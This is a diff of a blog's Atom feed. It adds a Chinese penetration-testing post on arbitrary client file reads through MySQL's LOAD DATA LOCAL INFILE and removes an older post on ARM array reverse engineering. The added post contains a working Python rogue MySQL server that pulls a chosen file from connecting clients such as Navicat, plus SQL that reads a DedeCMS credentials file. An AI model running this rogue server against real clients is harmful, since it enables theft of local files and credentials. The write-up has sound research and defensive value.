@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="/"/>
-  <updated>2020-01-16T08:16:55.346Z</updated>
+  <updated>2020-01-20T06:15:08.138Z</updated>
   <id>/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>MySQL客户端任意文件读取</title>
+    <link href="/2020/01/MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
+    <id>/2020/01/MySQL客户端任意文件读取/</id>
+    <published>2020-01-20T06:15:08.000Z</published>
+    <updated>2020-01-20T06:15:08.138Z</updated>
+    
+    <content type="html"><![CDATA[<p>最早遇到这个问题的时候，大概是刚开始做安全的时候，那时候还没意识到利用等实际价值。18年的时候记得有一个CTF题，利用的就是扫描MySQL端口来获取读文件flag。直到今天看到一位大佬的拓展文章，打算实际的去利用实践一下。</p><p><a href="https://lorexxar.cn/2020/01/14/css-mysql-chain" target="_blank" rel="noopener">https://lorexxar.cn/2020/01/14/css-mysql-chain</a></p><h3 id="LOAD-DATA-INFILE"><a href="#LOAD-DATA-INFILE" class="headerlink" title="LOAD DATA INFILE"></a><strong>LOAD DATA INFILE</strong></h3><p>LOAD DATA INFILE，作用是可以把文件读入到数据库的某个表里，如果在远程连接状态下使用了LOCAL关键字，即LOAD DATE LOCAL INFILE,那么就会从客户端读取一个本地文件，存入服务器端的table里。</p><p>如果执行<code>load data infile &quot;C:/Windows/win.ini&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;;</code>提示</p><p><img src="/images/2020/01/20/e5325b10-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119151353641.png"></p><p>受到<code>secure_file_priv</code>的导入导出限制。</p><p>但是使用<code>load data local infile &quot;C:/Windows/win.ini&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;;</code></p><p>就会把客户端的文件读取到服务端，并且不再受到<code>secure_file_priv</code>的导入导出限制。</p><p><img src="/images/2020/01/20/f1b88850-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119162253456.png"></p><p>也就是说只要我们伪造一个服务端，让客户端主动连接过来，这样我们就可以任意读取系统上的文件等。</p><h3 id="请求协议分析"><a href="#请求协议分析" class="headerlink" title="请求协议分析"></a>请求协议分析</h3><h4 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h4><p>先发送一个Greeting请求包，获取一些server信息。</p><p><img src="/images/2020/01/20/f8566920-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119162658492.png"></p><p>接着会发送一个认证请求包，包含账号密码</p><p><img src="/images/2020/01/20/fc5c6100-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119162740414.png"></p><p>后面会再接着发送一些查询请求，获取一些设置和编码信息等。</p><p><img src="/images/2020/01/20/031061e0-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119162840532.png"></p><h4 id="加载文件"><a href="#加载文件" class="headerlink" title="加载文件"></a>加载文件</h4><p>这时候我们点加载本地文件到test数据库中，会有三条相关的请求。第一条是发送查询语句</p><p><img src="/images/2020/01/20/0767ae10-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119162935498.png"></p><p>第二条是服务端返回了加载的文件地址给客户端</p><p><img src="/images/2020/01/20/0b95ee70-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119163231329.png"></p><p>第三条就是客户端根据返回的地址读取文件，发送给服务端</p><p><img src="/images/2020/01/20/1063ca30-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119163522298.png"></p><p>所以这相当于一个客户端根据服务端的返回来读取文件请求给服务端的过程，也就是服务端是一直可信的。</p><p>而此处的利用就是，当服务端不可信的时候，利用返回来读取连接的客户端的信息文件。</p><p>那么，是不是只有在加载LOAD DATA LOCAL的时候才可以进行读取客户端文件，而别的时候不行呢。官方有一句这么解释，此处翻译为中文</p><p><img src="/images/2020/01/20/140e3490-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119163953396.png"></p><p><strong>意思是可以在任何语句中返回具有读取权限的文件</strong>。</p><h3 id="受影响应用"><a href="#受影响应用" class="headerlink" title="受影响应用"></a>受影响应用</h3><p>server端使用如下脚本：</p><pre><code>#coding=utf-8 import socketimport logginglogging.basicConfig(level=logging.DEBUG)filename=&quot;C:\\Windows\\win.ini&quot;sv=socket.socket()sv.bind((&quot;&quot;,3306))sv.listen(5)conn,address=sv.accept()logging.info(&#39;Conn from: %r&#39;, address)conn.sendall(&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;)conn.recv(9999)logging.info(&quot;auth okay&quot;)conn.sendall(&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;)conn.recv(9999)logging.info(&quot;want file...&quot;)wantfile=chr(len(filename)+1)+&quot;\x00\x00\x01\xFB&quot;+filenameconn.sendall(wantfile)content=conn.recv(9999)logging.info(content)conn.close()</code></pre><p>利用Navicat Premium来连接，在配置中点击测试连接，就会有返回响应</p><p><img src="/images/2020/01/20/195f4a10-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119171211299.png"></p><p>python2的MySQLdb</p><p><img src="/images/2020/01/20/1d4bed90-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119171833747.png"></p><p>不过在测试中发现python3的pymysql确不受影响</p><p><img src="/images/2020/01/20/214ba3e0-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119172212466.png"></p><h3 id="拓展利用"><a href="#拓展利用" class="headerlink" title="拓展利用"></a>拓展利用</h3><p>在原文中，讲述了几种针对CMS的利用，那么就看一种针对dedecms的简单利用方式。</p><pre><code>load data local infile &quot;D:\\phpstudy_pro\\WWW\\DedeCMS\\data\\common.inc.php&quot; into table dede_log FIELDS TERMINATED BY &#39;\n&#39;;</code></pre><p><img src="/images/2020/01/20/26688a00-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200120135559523.png"></p><pre><code>select * from dede_log;</code></pre><p>使用dede默认的数据库的时候，连接信息被隐藏没有保存到数据。</p><p><img src="/images/2020/01/20/2bc49c00-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200120140154255.png"></p><p>先更改数据库</p><pre><code>use test;load data local infile &quot;D:\\phpstudy_pro\\WWW\\DedeCMS\\data\\common.inc.php&quot; into table test.test FIELDS TERMINATED BY &#39;\n&#39;;select * from test.test;</code></pre><p><img src="/images/2020/01/20/315aa9c0-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200120140411574.png"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;最早遇到这个问题的时候，大概是刚开始做安全的时候，那时候还没意识到利用等实际价值。18年的时候记得有一个CTF题，利用的就是扫描MySQL端口来获取读文件flag。直到今天看到一位大佬的拓展文章，打算实际的去利用实践一下。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://l
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
   
   <entry>
     <title>Kafka</title>
@@ -470,30 +494,6 @@ commons-logging-1.2.jar
       
         &lt;h3 id=&quot;结构体链表逆向&quot;&gt;&lt;a href=&quot;#结构体链表逆向&quot; class=&quot;headerlink&quot; title=&quot;结构体链表逆向&quot;&gt;&lt;/a&gt;结构体链表逆向&lt;/h3&gt;&lt;p&gt;同样使用如下的C代码：&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt
-      
-    
-    </summary>
-    
-    
-      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ARM数组重定向</title>
-    <link href="/2019/07/ARM%E6%95%B0%E7%BB%84%E9%87%8D%E5%AE%9A%E5%90%91/"/>
-    <id>/2019/07/ARM数组重定向/</id>
-    <published>2019-07-26T09:23:36.000Z</published>
-    <updated>2019-07-26T09:56:13.330Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="ARM数组重定向"><a href="#ARM数组重定向" class="headerlink" title="ARM数组重定向"></a>ARM数组重定向</h3><p>使用如下的C代码做演示，代码是无名侠的一份数组演示代码。如下：</p><pre><code>#include &lt;stdio.h&gt;// Arraysint g_Table[100];int g_Table2[100];void PrintAddr(){    printf(&quot;g_Table:0x%x\ng_Table2:%x\n&quot;,g_Table,g_Table2);}void InitTable(){    int i;    for(i=0;i&lt;100;i++)        g_Table[i] = i;    printf(&quot;Table1 init ok\n&quot;);    for(i=0;i&lt;100;i++)        g_Table2[i] = i;}int search(int key){    int i=0;    for(;i&lt;100;i++)    {        if(g_Table[i]==key)            return i;    }    return -1;}int read(int x){    return g_Table[x];}void write(int x,int value){     g_Table[x] = value;}int main(){    int idx;    PrintAddr();    InitTable();    write(2,200);    write(6,900);    if((idx = search(200))!=-1)        write(idx,400);}</code></pre><p>利用之前的makefile文件进行编译，打可执行文件丢入IDA中打开。选择main函数，大概就是酱紫</p><p><img src="\2019\07\ARM数组重定向\1563864556080.png" alt="1563864556080"></p><p>选择第一个函数PrintAddr来查看其中的实现代码。根据其中的注释就可以看出来输出是的打印g_Table和g_Table2。</p><p><img src="\2019\07\ARM数组重定向\1563865049285.png" alt="1563865049285"></p><p>而对于其中的这两个参数只有类似如下数组地址值，所以打印就是数组的地址。</p><pre><code>.text:00000400                 LDR     R2, =(g_Table_ptr - 0x1FE4).text:00000404                 LDR     R2, [R3,R2] ; g_Table</code></pre><p>回到main函数中，重新选择InitTable函数，在图表视图中可以看到此函数实现了两个循环，具体是哪种循环暂不得知，首先查看第一个循环，从开始的循环赋值和比较开始，</p><p><img src="\2019\07\ARM数组重定向\1563866904258.png" alt="1563866904258"></p><p>在左侧的循环体中，获取的是循环变量的值，在STR指令中，把循环变量存入到了R3(g_Table数组的地址值)，R2、*4代表了int型的四字节长度，所以此处意义是array[i] = i。按照循环变量的增长值按顺序存入到了数组中。</p><p>当循环变量大于99时，跳出循环走到右边的步骤，获取R3的地址值，R3则代表的是一串字符串，其后使用puts输出，利用puts是输出后，会自动在其后添加换行符。然后再对循环体重赋值。</p><p>继续查看第二个循环体，由于跟第一个循环一致，不在细看。</p><p><img src="\2019\07\ARM数组重定向\1563868287872.png" alt="1563868287872"></p><p>分析完InitTable函数后，可以得知，这是一个对全局数组进行赋值的操作。也许后面会用到这个数组。回到main函数中，其后调用了两次write函数，对每个write函数进行两个参数的引用。查看write函数。</p><p><img src="\2019\07\ARM数组重定向\1563868846505.png" alt="1563868846505"></p><p>函数跟InitTable其中对数组的操作类似，都是根据参数进入数组的赋值，如下的对write函数中的第一个参数作为数组的下标，以第二个参数作为需要重新赋值的数组值。array[var_8] = var_c。</p><p><img src="\2019\07\ARM数组重定向\1563870802372.png" alt="1563870802372"></p><p>在去选择search函数，查看函数实现和逻辑，其中传入参数var_10为200，进入循环判断是否大于99，进入循环体，获取数组的下标对应的值，来和传入的参数进行对比不相同则跳转继续循环。相同则跳出循环，获取数组下标值返回，类似如下</p><pre><code>R1 = array[var_8] = array[i]R3 = var_10 = 200if array[var_8] == var_10:    return var_8</code></pre><p><img src="\2019\07\ARM数组重定向\1563874211104.png" alt="1563874211104"></p><p>最后的main函数，重新调用了write函数，利用search的返回值来判断是否是-1，CMN是做负数对比。而R3的负数来源search函数的大于99后仍然没有找到返回值时，返回-1。</p><p><img src="\2019\07\ARM数组重定向\1563875783761.png" alt="1563875783761"></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;ARM数组重定向&quot;&gt;&lt;a href=&quot;#ARM数组重定向&quot; class=&quot;headerlink&quot; title=&quot;ARM数组重定向&quot;&gt;&lt;/a&gt;ARM数组重定向&lt;/h3&gt;&lt;p&gt;使用如下的C代码做演示，代码是无名侠的一份数组演示代码。如下：&lt;/p&gt;
-&lt;pre&gt;&lt;code
       
     
     </summary>
